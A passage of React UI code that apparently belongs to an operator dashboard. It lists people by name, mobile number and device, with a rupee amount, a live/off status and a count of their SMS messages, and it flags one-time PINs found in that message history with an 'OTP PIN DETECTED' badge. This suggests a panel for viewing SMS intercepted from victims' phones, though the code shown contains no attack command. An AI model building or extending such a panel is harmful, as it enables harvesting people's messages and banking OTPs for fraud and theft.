            if (Array.isArray(history)) {
                return history.some(sms => extractOTP(sms.body || sms.message));
            }
            return false;
        } catch { return false; }
    }, [app.smsHistory]);

    return (
        <Paper
            onClick={onTap}
            sx={{
                display: 'flex', alignItems: 'center', gap: 1.5,
                p: 1.8, borderRadius: '16px',
                backgroundColor: 'var(--bg-card)',
                border: live
                    ? '1px solid rgba(16, 185, 129, 0.15)'
                    : '1px solid var(--border-subtle)',
                cursor: 'pointer',
                transition: 'all 0.2s',
                animation: `fadeInUp 0.4s ${delay}ms ease-out both`,
                position: 'relative',
                overflow: 'hidden',
                '&:hover': {
                    borderColor: 'rgba(16, 185, 129, 0.3)',
                    backgroundColor: 'rgba(15, 23, 42, 0.95)',
                },
                '&:active': { transform: 'scale(0.985)' },
            }}
        >
            {/* Live indicator bar */}
            <Box sx={{
                position: 'absolute', left: 0, top: 0, bottom: 0,
                width: 3,
                backgroundColor: live ? '#10b981' : 'var(--text-muted)',
                borderRadius: '0 4px 4px 0',
                transition: 'background-color 0.5s',
                ...(live && {
                    boxShadow: '0 0 8px rgba(16,185,129,0.3)',
                }),
            }} />

            {/* Avatar */}
            <Box sx={{
                width: 44, height: 44, borderRadius: '14px', ml: 0.5,
                background: live
                    ? 'linear-gradient(135deg, rgba(16,185,129,0.15), rgba(16,185,129,0.05))'
                    : 'rgba(255,255,255,0.03)',
                border: `1px solid ${live ? 'rgba(16,185,129,0.2)' : 'var(--border-subtle)'}`,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                flexShrink: 0,
                color: live ? '#10b981' : 'var(--text-muted)',
                fontSize: '16px', fontWeight: 800,
            }}>
                {safeStr(app?.fullName).charAt(0).toUpperCase() || <User size={20} />}
            </Box>

            {/* Info */}
            <Box sx={{ flex: 1, minWidth: 0 }}>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8, mb: 0.3 }}>
                    <Typography sx={{
                        fontSize: '14px', fontWeight: 800, color: 'var(--text-primary)',
                        lineHeight: 1.2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                    }}>
                        {safeStr(app?.fullName) || 'Unknown'}
                    </Typography>
                </Box>

                {/* ID row with SMS POP badge */}
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8 }}>
                    <Typography className="mono" sx={{ fontSize: '10px', color: '#d4a853', letterSpacing: '0.03em', fontWeight: 600 }}>
                        {shortId(appId)}
                    </Typography>

                    {/* SMS POP Badge */}
                    {smsCount > 0 && (
                        <Box className="pop-badge" sx={{
                            display: 'inline-flex', alignItems: 'center', gap: '3px',
                            height: 18, px: 0.7,
                            borderRadius: '9px',
                            backgroundColor: 'rgba(16, 185, 129, 0.15)',
                            border: '1px solid rgba(16, 185, 129, 0.3)',
                        }}>
                            <MessageSquare size={9} color="#10b981" />
                            <Typography sx={{ fontSize: '9px', fontWeight: 800, color: '#10b981', fontFamily: '"JetBrains Mono", monospace' }}>
                                {smsCount}
                            </Typography>
                        </Box>
                    )}

                    {hasOTP && (
                        <Tooltip title="OTP PIN DETECTED">
                            <Box sx={{
                                display: 'inline-flex', alignItems: 'center',
                                height: 18, px: 0.5,
                                borderRadius: '4px',
                                backgroundColor: 'rgba(212, 168, 83, 0.2)',
                                border: '1px solid rgba(212, 168, 83, 0.4)',
                                animation: 'pulse 2s infinite'
                            }}>
                                <Zap size={10} color="#d4a853" fill="#d4a853" />
                            </Box>
                        </Tooltip>
                    )}

                    <Box sx={{ width: 3, height: 3, borderRadius: '50%', backgroundColor: 'var(--text-muted)', opacity: 0.3 }} />
                    <Typography className="mono" sx={{ fontSize: '10px', color: 'var(--text-muted)' }}>
                        {safeStr(app?.mobile) || '---'}
                    </Typography>
                </Box>

                <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5, mt: 0.5 }}>
                    <Smartphone size={10} color="var(--text-muted)" />
                    <Typography sx={{ fontSize: '10px', color: 'var(--text-muted)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {device}
                    </Typography>
                </Box>
            </Box>

            {/* Right side: amount + status */}
            <Box sx={{ textAlign: 'right', flexShrink: 0 }}>
                <Typography className="mono" sx={{ fontSize: '13px', fontWeight: 800, color: '#10b981', lineHeight: 1 }}>
                    ₹{amount > 0 ? (amount / 1000).toFixed(0) + 'K' : '—'}
                </Typography>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.4, justifyContent: 'flex-end', mt: 0.5 }}>
                    <Box sx={{
                        width: 6, height: 6, borderRadius: '50%',
                        backgroundColor: live ? '#10b981' : '#ef4444',
                        ...(live && { boxShadow: '0 0 6px rgba(16,185,129,0.4)' }),
                    }} className={live ? 'pulse-dot' : ''} />
                    <Typography sx={{ fontSize: '9px', fontWeight: 700, color: live ? '#10b981' : '#ef4444', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                        {live ? 'Live' : 'Off'}
                    </Typography>
                </Box>
                <Typography className="mono" sx={{ fontSize: '9px', color: 'var(--text-muted)', mt: 0.3 }}>
                    {safeDate(app?.createdAt) ? format(safeDate(app.createdAt), 'HH:mm') : ''}
                </Typography>
            </Box>

            <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1, ml: 1 }}>
                <IconButton
                    size="small"
                    onClick={onDelete}
                    sx={{
                        color: 'var(--text-muted)',
                        '&:hover': { color: '#ef4444', backgroundColor: 'rgba(239, 68, 68, 0.1)' }
                    }}
                >
                    <X size={16} />
                </IconButton>
                <ChevronRight size={16} color="var(--text-muted)" style={{ opacity: 0.4 }} />
            </Box>
        </Paper>
    );
}

function InfoRow({ icon, label, value, onCopy, valueColor }) {
    return (
        <Paper sx={{
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            p: 1.8, borderRadius: '14px',
            backgroundColor: 'rgba(255,255,255,0.02)',
            border: '1px solid var(--border-subtle)',
        }}>
            <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, minWidth: 0, flex: 1 }}>
                <Box sx={{ color: 'var(--text-muted)', flexShrink: 0 }}>{icon}</Box>
                <Box sx={{ minWidth: 0 }}>
                    <Typography sx={{ fontSize: '9px', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.12em', mb: 0.2 }}>
                        {label}
                    </Typography>
                    <Typography sx={{
                        fontSize: '14px', fontWeight: 700,
                        color: valueColor || 'var(--text-primary)',
                        overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                    }}>
                        {safeStr(value) || '—'}
                    </Typography>
                </Box>
            </Box>
            {onCopy && value && (
                <IconButton size="small" onClick={(e) => { e.stopPropagation(); onCopy(); }} sx={{ color: 'var(--text-muted)' }}>
                    <Copy size={14} />
                </IconButton>
            )}
        </Paper>
    );
}

function SectionLabel({ text }) {
    return (
        <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, pt: 1 }}>
            <Box sx={{ width: 3, height: 12, borderRadius: 2, background: 'linear-gradient(to bottom, #10b981, #34d399)' }} />
            <Typography sx={{ fontSize: '10px', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.15em' }}>
                {text}
            </Typography>
        </Box>
    );
}
